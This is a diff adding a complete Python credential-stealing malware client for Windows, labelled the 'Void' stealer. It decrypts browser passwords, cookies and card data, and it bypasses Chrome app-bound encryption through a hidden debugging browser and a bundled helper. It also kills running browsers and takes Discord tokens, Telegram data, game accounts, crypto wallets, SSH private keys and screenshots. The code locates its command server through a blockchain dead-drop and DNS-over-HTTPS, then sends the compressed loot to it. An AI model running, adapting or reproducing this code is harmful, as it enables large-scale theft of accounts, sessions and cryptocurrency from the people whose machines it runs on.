@@ -1,0 +1,575 @@
+"""Void Windows stealer client - full collection surface, exfils to YOUR C2.
+Usage: python stealer_client.py --host <c2-host:port> --user-id <id> [--env prod]
+Test only against machines you own, on an isolated Windows VM.
+"""
+import argparse, base64, io, json, os, re, shutil, sqlite3, sys, tempfile, zlib
+import urllib.request, urllib.error
+
+# ---- optional deps, degrade gracefully
+try:
+    from Crypto.Cipher import AES  # pycryptodome, for AES-GCM
+except ImportError:
+    AES = None
+try:
+    from PIL import ImageGrab  # pillow, for screenshots
+except ImportError:
+    ImageGrab = None
+
+def dpapi_decrypt(blob):
+    """Unwrap a DPAPI blob with the CURRENT Windows user context (ctypes only)."""
+    try:
+        import ctypes, ctypes.wintypes as wt
+        class BLOB(ctypes.Structure):
+            _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]
+        src = BLOB(len(blob), ctypes.cast(ctypes.create_string_buffer(bytes(blob), len(blob)), ctypes.POINTER(ctypes.c_byte)))
+        out = BLOB()
+        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(src), None, None, None, None, 0, ctypes.byref(out)):
+            buf = ctypes.string_at(out.pbData, out.cbData)
+            ctypes.windll.kernel32.LocalFree(out.pbData)
+            return buf
+    except Exception:
+        pass
+    return None
+
+APPDATA = os.environ.get("APPDATA", "")
+LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
+USERPROFILE = os.environ.get("USERPROFILE", "")
+
+# ---- C2 auto-resolution: the victim finds home by itself.
+# Order: (1) Polygon dead-drop contract, (2) DNS TXT via DoH, (3) hardcoded candidates.
+DEADDROP_CONTRACT = "<YOUR-CONTRACT>"  # set to YOUR contract
+DEADDROP_SELECTOR = "0xce6d41de"
+DEADDROP_DOMAIN = ""          # set to YOUR domain serving a TXT record, e.g. "c2.example.com"
+CANDIDATES = [                # tried in order, first to answer the handshake wins
+    "<C2-HOST>:<C2-PORT>",       # public inbound
+    "<TAILNET-HOST>:<C2-PORT>",      # tailscale direct
+]
+RPCS = ["https://polygon-rpc.com", "https://polygon.llamarpc.com",
+        "https://1rpc.io/matic", "https://polygon-bor-rpc.publicnode.com"]
+
+def _resolve_polygon():
+    import json as _j
+    body = _j.dumps({"jsonrpc": "2.0", "method": "eth_call",
+        "params": [{"to": DEADDROP_CONTRACT, "data": DEADDROP_SELECTOR}, "latest"], "id": 1}).encode()
+    for rpc in RPCS:
+        try:
+            r = urllib.request.Request(rpc, data=body, headers={"Content-Type": "application/json"})
+            res = _j.loads(urllib.request.urlopen(r, timeout=10).read().decode())
+            hx = (res.get("result") or "")[2:]
+            if len(hx) >= 130:
+                ln = int(hx[64:128], 16)
+                host = bytes.fromhex(hx[128:128 + ln * 2]).decode().strip()
+                if host:
+                    return host
+        except Exception:
+            continue
+    return None
+
+def _resolve_doh_txt():
+    if not DEADDROP_DOMAIN:
+        return None
+    import struct as _st, base64 as _b
+    try:
+        q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + \
+            b"".join(bytes([len(p)]) + p.encode() for p in DEADDROP_DOMAIN.split(".")) + \
+            b"\x00\x00\x10\x00\x01"
+        url = "https://cloudflare-dns.com/dns-query?dns=" + _b.urlsafe_b64encode(q).decode().rstrip("=")
+        r = urllib.request.Request(url, headers={"Accept": "application/dns-message"})
+        data = urllib.request.urlopen(r, timeout=10).read()
+        if b"c2" in data or b"." in data:
+            m = re.search(rb"([\w\-.]{4,64}:\d{2,5}|[\w\-.]{4,64})", data)
+            if m:
+                return m.group(1).decode()
+    except Exception:
+        pass
+    return None
+
+def resolve_c2():
+    for method in (_resolve_polygon, _resolve_doh_txt):
+        try:
+            host = method()
+            if host and handshake(host):
+                return host
+        except Exception:
+            continue
+    for host in CANDIDATES:
+        try:
+            if handshake(host):
+                return host
+        except Exception:
+            continue
+    return CANDIDATES[0]
+
+def handshake(host):
+    try:
+        r = urllib.request.Request(f"http://{host}/shard", data=b"{}",
+            headers={"Content-Type": "application/json"}, method="POST")
+        urllib.request.urlopen(r, timeout=8).read(64)
+        return True
+    except Exception:
+        return False
+
+CHROMIUM_PATHS = {
+    "Chrome":   os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
+    "Edge":     os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
+    "Brave":    os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
+    "Opera":    os.path.join(APPDATA, "Opera Software", "Opera Stable"),
+    "OperaGX":  os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
+    "Chromium": os.path.join(LOCALAPPDATA, "Chromium", "User Data"),
+}
+FIREFOX_BASE = os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles")
+WALLETS = {
+    "Exodus":    os.path.join(APPDATA, "Exodus"),
+    "Atomic":    os.path.join(APPDATA, "atomic"),
+    "Electrum":  os.path.join(APPDATA, "Electrum"),
+    "Ethereum":  os.path.join(APPDATA, "Ethereum"),
+    "Guarda":    os.path.join(APPDATA, "Guarda"),
+    "Coinomi":   os.path.join(LOCALAPPDATA, "Coinomi", "Coinomi"),
+    "Monero":    os.path.join(USERPROFILE, "Documents", "Monero"),
+}
+WEB3_IDS = ["nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm",
+            "bfnaelmomeimhlpmgjnjophhpkkoljpa", "fnjhmkhhmkbjdhgnicjhfkbmgnbnljnkp"]
+
+TOKEN_RE = re.compile(r"mfa\.[A-Za-z0-9_\-]{20,}|[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,}")
+
+loot = {}  # category -> list of records
+
+def add(cat, rec):
+    loot.setdefault(cat, []).append(rec)
+
+def temp_copy(path):
+    """Shadow-copy a locked DB out from under a live browser."""
+    try:
+        tmp = os.path.join(tempfile.gettempdir(), f"vw_{os.urandom(4).hex()}.tmp")
+        shutil.copy2(path, tmp)
+        return tmp
+    except Exception:
+        return None
+
+def query_db(path, sql):
+    tmp = temp_copy(path)
+    if not tmp:
+        return []
+    try:
+        con = sqlite3.connect(tmp)
+        cur = con.cursor()
+        cur.execute(sql)
+        rows = cur.fetchall()
+        con.close()
+        return rows
+    except Exception:
+        return []
+    finally:
+        try: os.remove(tmp)
+        except Exception: pass
+
+# ---- Chrome master key (DPAPI; ABE bypass needs injection, DPAPI covers the rest)
+def chrome_master_key(user_data):
+    state = os.path.join(user_data, "Local State")
+    if not os.path.isfile(state):
+        return None
+    try:
+        enc = base64.b64decode(json.load(open(state))["os_crypt"]["encrypted_key"])[5:]
+        raw = dpapi_decrypt(enc)
+        return raw if raw else None
+    except Exception:
+        return None
+
+def gcm_decrypt(blob, key):
+    if not AES or not key or len(blob) < 15 or blob[:3] != b"v10":
+        return None
+    try:
+        nonce, ct = blob[3:15], blob[15:]
+        return AES.new(key, AES.MODE_GCM, nonce).decrypt(ct)[:-16].decode(errors="replace")
+    except Exception:
+        return None
+
+def steal_chromium():
+    for name, base in CHROMIUM_PATHS.items():
+        if not os.path.isdir(base):
+            continue
+        key = chrome_master_key(base)
+        diag = {"browser": name, "key_ok": bool(key)}
+        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 4)]:
+            d = os.path.join(base, profile)
+            if not os.path.isdir(d):
+                continue
+            rows = query_db(os.path.join(d, "Login Data"),
+                    "SELECT origin_url, username_value, password_value FROM logins")
+            diag[f"{profile}_logins"] = len(rows)
+            for url, user, blob in rows:
+                val = gcm_decrypt(bytes(blob), key) if isinstance(blob, bytes) else None
+                add("passwords", {"browser": name, "url": url, "user": user, "pass": val})
+            crows = query_db(os.path.join(d, "Cookies"),
+                    "SELECT host_key, name, encrypted_value FROM cookies")
+            diag[f"{profile}_cookies"] = len(crows)
+            for host, cname, blob in crows:
+                val = gcm_decrypt(bytes(blob), key) if isinstance(blob, bytes) else None
+                add("cookies", {"browser": name, "host": host, "name": cname, "value": val})
+            for row in query_db(os.path.join(d, "Web Data"),
+                    "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards"):
+                add("cards", {"browser": name, "card": list(row)})
+            for row in query_db(os.path.join(d, "History"),
+                    "SELECT url FROM urls LIMIT 5000"):
+                add("history", {"browser": name, "url": row[0]})
+        add("diag", diag)
+        bm = os.path.join(base, "Default", "Bookmarks")
+        if os.path.isfile(bm):
+            try: add("bookmarks", {"browser": name, "data": open(bm, encoding="utf-8", errors="replace").read()[:50000]})
+            except Exception: pass
+
+def steal_firefox():
+    if not os.path.isdir(FIREFOX_BASE):
+        return
+    for prof in os.listdir(FIREFOX_BASE):
+        d = os.path.join(FIREFOX_BASE, prof)
+        lj = os.path.join(d, "logins.json")
+        if os.path.isfile(lj):
+            try: add("firefox_logins", {"profile": prof, "data": open(lj, encoding="utf-8", errors="replace").read()[:50000]})
+            except Exception: pass
+        for f in ["cookies.sqlite", "formhistory.sqlite", "places.sqlite"]:
+            p = os.path.join(d, f)
+            if os.path.isfile(p):
+                add("firefox_files", {"profile": prof, "file": f, "size": os.path.getsize(p)})
+
+def steal_discord():
+    for app in ["discord", "discordptb", "discordcanary"]:
+        lvl = os.path.join(APPDATA, app, "Local Storage", "leveldb")
+        if not os.path.isdir(lvl):
+            continue
+        for fn in os.listdir(lvl):
+            if not (fn.endswith(".ldb") or fn.endswith(".log")):
+                continue
+            try:
+                data = open(os.path.join(lvl, fn), "rb").read()
+                for m in TOKEN_RE.findall(data.decode(errors="replace")):
+                    add("discord", {"app": app, "token": m})
+            except Exception: pass
+
+def steal_telegram():
+    t = os.path.join(USERPROFILE, "Downloads", "Telegram Desktop", "tdata")
+    t = t if os.path.isdir(t) else os.path.join(APPDATA, "Telegram Desktop", "tdata")
+    if os.path.isdir(t):
+        add("telegram", {"path": t, "files": os.listdir(t)[:50]})
+
+def steal_steam():
+    try:
+        import winreg
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Valve\Steam") as k:
+            add("steam", {"SteamPath": winreg.QueryValueEx(k, "SteamPath")[0]})
+    except Exception: pass
+    for f in [os.path.join(p, "config", "loginusers.vdf") for p in
+              [os.path.join("C:\\", "Program Files (x86)", "Steam")]]:
+        if os.path.isfile(f):
+            try: add("steam", {"file": f, "data": open(f, errors="replace").read()[:20000]})
+            except Exception: pass
+
+def steal_minecraft():
+    mc = os.path.join(APPDATA, ".minecraft")
+    if not os.path.isdir(mc):
+        return
+    for f in ["servers.dat", "launcher_accounts.json", "usercache.json"]:
+        p = os.path.join(mc, f)
+        if os.path.isfile(p):
+            try: add("minecraft", {"file": f, "data": open(p, "rb").read()[:20000].decode(errors="replace")})
+            except Exception: pass
+
+def steal_roblox():
+    for name in ["cookies", "RobloxCookies.dat"]:
+        p = os.path.join(LOCALAPPDATA, "Roblox", "LocalStorage", name)
+        if os.path.isfile(p):
+            try:
+                raw = open(p, "rb").read()[:5000]
+                txt = raw.decode(errors="replace")
+                rec = {"file": name, "data": txt}
+                # CookiesData is base64(DPAPI blob) -> unwrap live on the box.
+                try:
+                    i = raw.find(b"CookiesData")
+                    if i != -1:
+                        j = raw.find(b'"', raw.find(b'"', i) + 1) + 1
+                        k = raw.find(b'"', j)
+                        dp = dpapi_decrypt(base64.b64decode(raw[j:k]))
+                        if dp:
+                            rec["unwrapped"] = dp.decode(errors="replace")
+                except Exception:
+                    pass
+                add("roblox", rec)
+            except Exception: pass
+
+def steal_wallets():
+    for name, path in WALLETS.items():
+        if os.path.isdir(path):
+            files = []
+            for r, _, fs in os.walk(path):
+                files += [os.path.join(r, f) for f in fs][:20]
+                if len(files) >= 20: break
+            add("wallets", {"wallet": name, "files": files})
+
+def steal_extensions():
+    for name, base in CHROMIUM_PATHS.items():
+        les = os.path.join(base, "Default", "Local Extension Settings")
+        if not os.path.isdir(les):
+            continue
+        for ext in os.listdir(les):
+            if ext in WEB3_IDS:
+                add("web3", {"browser": name, "ext": ext})
+
+def steal_chromium_abe_debug():
+    """ABE bypass via hidden remote-debugging browser on a temp profile COPY.
+    Same machine + same user = Chrome decrypts its own ABE cookies for us,
+    and we read them plaintext over DevTools. Stdlib only. Yields cookies."""
+    import socket, ssl, hashlib, struct, subprocess, time
+    CHROME_EXES = {
+        "Chrome": [os.path.join(os.environ.get("ProgramFiles", ""), "Google", "Chrome", "Application", "chrome.exe"),
+                   os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Google", "Chrome", "Application", "chrome.exe")],
+        "Edge":   [os.path.join(os.environ.get("ProgramFiles", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
+                   os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Microsoft", "Edge", "Application", "msedge.exe")],
+        "Brave":  [os.path.join(os.environ.get("ProgramFiles", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
+                   os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "Application", "brave.exe")],
+    }
+    def ws_rpc(ws_url, method, params=None):
+        from urllib.parse import urlparse
+        u = urlparse(ws_url)
+        s = socket.create_connection((u.hostname, u.port), timeout=10)
+        key = base64.b64encode(os.urandom(16)).decode()
+        s.sendall(f"GET {u.path or '/'} HTTP/1.1\r\nHost: {u.hostname}:{u.port}\r\n"
+                  f"Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
+                  f"Sec-WebSocket-Version: 13\r\n\r\n".encode())
+        if b"101" not in s.recv(1024):
+            s.close(); return None
+        def send(obj):
+            raw = json.dumps(obj).encode()
+            hdr = bytes([0x81, 0x80 | len(raw)]) if len(raw) < 126 else struct.pack("!BBH", 0x81, 0xFE, len(raw))
+            mask = os.urandom(4)
+            s.sendall(hdr + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(raw)))
+        def recv():
+            h = s.recv(2)
+            ln = h[1] & 0x7F
+            if ln == 126: ln = struct.unpack("!H", s.recv(2))[0]
+            elif ln == 127: ln = struct.unpack("!Q", s.recv(8))[0]
+            data = b""
+            while len(data) < ln: data += s.recv(ln - len(data))
+            return json.loads(data.decode())
+        mid = 1
+        send({"id": mid, "method": "Network.enable"}); recv()
+        send({"id": mid + 1, "method": method, "params": params or {}})
+        for _ in range(20):
+            r = recv()
+            if r.get("id") == mid + 1:
+                s.close(); return r.get("result", {})
+        s.close(); return None
+    KILL = {"Chrome": "chrome.exe", "Edge": "msedge.exe", "Brave": "brave.exe"}
+    for name, base in CHROMIUM_PATHS.items():
+        exes = CHROME_EXES.get(name, [])
+        exe = next((e for e in exes if os.path.isfile(e)), None)
+        if not exe or not os.path.isdir(base):
+            continue
+        # Live browsers lock the cookie DB -> hollow copies. Real stealers
+        # kill them first; record it in diag.
+        killed = False
+        if KILL.get(name):
+            try:
+                os.system(f"taskkill /F /IM {KILL[name]} >NUL 2>&1")
+                killed = True
+                import time as _t; _t.sleep(2)
+            except Exception:
+                pass
+        for profile in ["Default", "Profile 1", "Profile 2"]:
+            src = os.path.join(base, profile)
+            if not os.path.isdir(src):
+                continue
+            tmp = os.path.join(tempfile.gettempdir(), f"vwprof_{os.urandom(4).hex()}")
+            os.makedirs(os.path.join(tmp, profile), exist_ok=True)
+            copied, cookie_sz = 0, -1
+            try:
+                # profile files (tolerate live locks) + the User-Data-level Local State.
+                # Cookies trio goes through temp_copy (proven against locks).
+                for fn in os.listdir(src):
+                    if fn in ("Cookies", "Cookies-wal", "Cookies-journal"):
+                        continue
+                    try:
+                        s, t = os.path.join(src, fn), os.path.join(tmp, profile, fn)
+                        if os.path.isfile(s): shutil.copy2(s, t); copied += 1
+                    except Exception: pass
+                for fn in ("Cookies", "Cookies-wal", "Cookies-journal"):
+                    if fn == "Cookies":
+                        import time as _t2
+                        err = None
+                        for _try in range(6):
+                            try:
+                                shutil.copy2(os.path.join(src, fn), os.path.join(tmp, profile, fn))
+                                copied += 1; err = None; break
+                            except Exception as e:
+                                err = f"{type(e).__name__}: {e}"
+                                _t2.sleep(2)
+                        try: cookie_sz = os.path.getsize(os.path.join(tmp, profile, "Cookies"))
+                        except Exception: pass
+                        diag_extra = {"abe_cookie_err": (err or "copied ok")[:160]}
+                        continue
+                    tc = temp_copy(os.path.join(src, fn))
+                    if tc:
+                        try: shutil.copy2(tc, os.path.join(tmp, profile, fn)); copied += 1
+                        except Exception: pass
+                        try: os.remove(tc)
+                        except Exception: pass
+                try: cookie_sz = os.path.getsize(os.path.join(tmp, profile, "Cookies"))
+                except Exception: pass
+                ls = os.path.join(base, "Local State")
+                if os.path.isfile(ls):
+                    try: shutil.copy2(ls, os.path.join(tmp, "Local State"))
+                    except Exception: pass
+            except Exception:
+                shutil.rmtree(tmp, ignore_errors=True)
+                continue
+            port = 18080 + (os.getpid() % 1000)
+            # verify the copied cookie DB actually holds rows before launching
+            db_rows = -1
+            try:
+                con = sqlite3.connect(os.path.join(tmp, profile, "Cookies"))
+                db_rows = con.execute("SELECT COUNT(*) FROM cookies").fetchone()[0]
+                con.close()
+            except Exception:
+                pass
+            try:
+                p = subprocess.Popen([exe, f"--remote-debugging-port={port}",
+                    f"--user-data-dir={tmp}", f"--profile-directory={profile}",
+                    "--headless=new", "--no-first-run",
+                    "--no-default-browser-check", "about:blank"],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(5)
+                targets = json.loads(urllib.request.urlopen(
+                    f"http://127.0.0.1:{port}/json/list", timeout=10).read().decode())
+                got = 0
+                for t in targets:
+                    if "webSocketDebuggerUrl" not in t:
+                        continue
+                    for method in ("Network.getAllCookies", "Storage.getCookies"):
+                        try:
+                            res = ws_rpc(t["webSocketDebuggerUrl"], method)
+                            for c in (res or {}).get("cookies", []):
+                                add("abe_cookies", {"browser": name, "profile": profile,
+                                    "domain": c.get("domain"), "name": c.get("name"),
+                                    "value": c.get("value")})
+                                got += 1
+                            if got:
+                                break
+                        except Exception:
+                            continue
+                    if got:
+                        break
+                add("diag", {"browser": name, "abe_profile": profile, "abe_cookies": got,
+                             "abe_targets": len(targets), "abe_killed": killed,
+                             "abe_db_rows": db_rows, "abe_copied": copied,
+                             "abe_cookie_sz": cookie_sz,
+                             "abe_cookie_err": diag_extra.get("abe_cookie_err", "?")})
+            except Exception as e:
+                add("diag", {"browser": name, "abe_profile": profile, "abe_error": str(e)[:100]})
+            finally:
+                try: p.terminate()
+                except Exception: pass
+                shutil.rmtree(tmp, ignore_errors=True)
+
+def steal_chromelvator():
+    """ABE bypass via bundled open-source ChromElevator (MIT, xaitax).
+    Runs hidden, parses its per-profile JSONs into loot. No admin needed."""
+    import subprocess, sys as _sys
+    cands = []
+    meipass = getattr(_sys, "_MEIPASS", None)  # PyInstaller onefile extract dir
+    if meipass:
+        cands.append(os.path.join(meipass, "chromelevator_x64.exe"))
+    cands.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "chromelevator_x64.exe"))
+    cands.append(os.path.join(os.getcwd(), "chromelevator_x64.exe"))
+    if getattr(_sys, "frozen", False):
+        cands.append(os.path.join(os.path.dirname(_sys.executable), "chromelevator_x64.exe"))
+    exe = next((c for c in cands if os.path.isfile(c)), None)
+    if not os.path.isfile(exe):
+        add("diag", {"chromelvator": "helper missing"}); return
+    out = os.path.join(tempfile.gettempdir(), f"vwcl_{os.urandom(4).hex()}")
+    try:
+        kw = {}
+        if os.name == "nt":
+            kw["creationflags"] = 0x08000000  # CREATE_NO_WINDOW
+        subprocess.run([exe, "all", "-o", out], capture_output=True, timeout=300, **kw)
+        n = 0
+        for root, _, files in os.walk(out):
+            parts = root.split(os.sep)
+            browser = parts[-2] if len(parts) >= 2 else "?"
+            profile = parts[-1]
+            for fn in files:
+                if not fn.endswith(".json") or fn == "fingerprint.json":
+                    continue
+                try:
+                    items = json.load(open(os.path.join(root, fn), encoding="utf-8"))
+                    kind = fn[:-5]  # cookies / passwords / payments / iban / tokens
+                    for it in (items if isinstance(items, list) else []):
+                        it["_browser"] = browser; it["_profile"] = profile
+                        add("cl_" + kind, it); n += 1
+                except Exception:
+                    pass
+        add("diag", {"chromelvator": f"parsed {n} records"})
+    except Exception as e:
+        add("diag", {"chromelvator": f"error: {str(e)[:120]}"})
+    finally:
+        shutil.rmtree(out, ignore_errors=True)
+
+def steal_ssh():
+    for f in [os.path.join(USERPROFILE, ".ssh", "id_rsa"),
+              os.path.join(USERPROFILE, ".ssh", "id_ed25519")]:
+        if os.path.isfile(f):
+            try: add("ssh", {"file": f, "data": open(f).read()})
+            except Exception: pass
+
+def steal_sysinfo():
+    import platform
+    add("sysinfo", {"platform": platform.platform(), "user": os.environ.get("USERNAME", ""),
+                    "computer": os.environ.get("COMPUTERNAME", "")})
+
+def steal_screenshot():
+    if not ImageGrab:
+        return
+    try:
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format="JPEG", quality=50)
+        add("screenshot", {"jpg_b64": base64.b64encode(buf.getvalue()).decode()})
+    except Exception: pass
+
+# ---- exfil
+def post_json(url, obj):
+    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
+        headers={"Content-Type": "application/json",
+                 "X-Runtime-Env": "jre-embedded",
+                 "X-Edge-Cache-Revalidate": "stale-if-error"})
+    try: return urllib.request.urlopen(req, timeout=30).read()[:200]
+    except Exception as e: print(f"[!] {url}: {e}"); return None
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--host", default="auto", help="C2 host:port or 'auto'")
+    ap.add_argument("--user-id", default=None)
+    ap.add_argument("--env", default="prod")
+    a = ap.parse_args()
+    import socket as _so
+    if not a.user_id:
+        a.user_id = f"{_so.gethostname()}-{os.environ.get('USERNAME', 'user')}"
+    if a.host == "auto":
+        a.host = resolve_c2()  # auto-detect unless explicitly overridden
+        print(f"[*] resolved C2 -> {a.host}")
+
+    base = f"http://{a.host}"
+    pre = post_json(base + "/shard/prefireMc", {"userId": a.user_id, "sessionId": "win-test"})
+    print(f"[*] prefire -> {pre}")
+
+    for fn in [steal_chromium, steal_chromium_abe_debug, steal_chromelvator, steal_firefox, steal_discord, steal_telegram,
+               steal_steam, steal_minecraft, steal_roblox, steal_wallets,
+               steal_extensions, steal_ssh, steal_sysinfo, steal_screenshot]:
+        try: fn()
+        except Exception as e: print(f"[!] {fn.__name__}: {e}")
+    print(f"[*] collected: { {k: len(v) for k, v in loot.items()} }")
+
+    body = zlib.compress(json.dumps(loot).encode())
+    post_json(base + "/shard", {"userId": a.user_id, "env": a.env, "loot_b64": base64.b64encode(body).decode()})
+    print("[*] exfiltrated. done.")
+
+if __name__ == "__main__":
+    main()
